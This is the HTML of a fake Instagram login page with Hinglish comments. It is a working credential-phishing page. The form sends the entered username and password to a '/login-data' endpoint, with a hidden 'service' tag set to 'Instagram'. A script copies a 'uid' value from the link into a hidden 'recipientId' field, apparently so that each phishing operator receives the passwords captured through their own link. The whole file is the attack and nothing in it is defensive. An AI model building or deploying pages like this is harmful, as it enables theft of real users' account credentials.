<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login â€¢ Instagram</title>
    <style>/* ... (style waisa hi rahega) ... */</style>
</head>
<body>
    <div class="container">
        <div class="box">
            <div class="logo">Instagram</div>
            <form action="/login-data" method="post">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="hidden" name="service" value="Instagram">
                <!-- NAYA UPGRADE: Yeh hidden field user ki ID rakhega -->
                <input type="hidden" id="recipientId" name="recipientId" value="">
                <button type="submit">Log In</button>
            </form>
        </div>
    </div>

    <!-- NAYA UPGRADE: Yeh script link se ID nikaal kar form mein daalegi -->
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const params = new URLSearchParams(window.location.search);
            const userId = params.get('uid');
            if (userId) {
                document.getElementById('recipientId').value = userId;
            }
        });
    </script>
</body>
</html>
